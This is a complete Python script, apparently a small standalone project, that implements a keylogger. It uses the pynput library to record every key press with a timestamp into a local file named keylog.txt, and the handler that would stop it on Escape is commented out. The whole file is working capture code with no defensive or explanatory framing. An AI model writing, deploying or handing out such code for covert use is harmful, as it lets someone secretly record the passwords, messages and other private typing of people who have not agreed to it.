import os
from datetime import datetime
from pynput import keyboard


class KeyLogger:

    def __init__(self):
        self.file_name = 'keylog.txt'
        self.create_file()

    def create_file(self):
        try:
            if not os.path.exists(self.file_name):
                with open(self.file_name, 'w') as file:
                    file.write("Keylogger started...\n")
        except Exception as e:
            print(f'An error occurred: {e}')

    def log_key(self, key):
       
        # if key == keyboard.Key.esc:  
        #     print("Exiting keylogger...")
        #     return False  
        try:
           
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(self.file_name, 'a') as file:
                file.write(f'{timestamp} - {key}\n')
        except Exception as e:
            print(f'An error occurred: {e}')

    def start_logging(self):
       
        with keyboard.Listener(on_press=self.log_key) as listener:
            listener.join()
              

class Main:
    def __init__(self):
        keylogger = KeyLogger()
        keylogger.start_logging()

if __name__ == "__main__":
    Main()
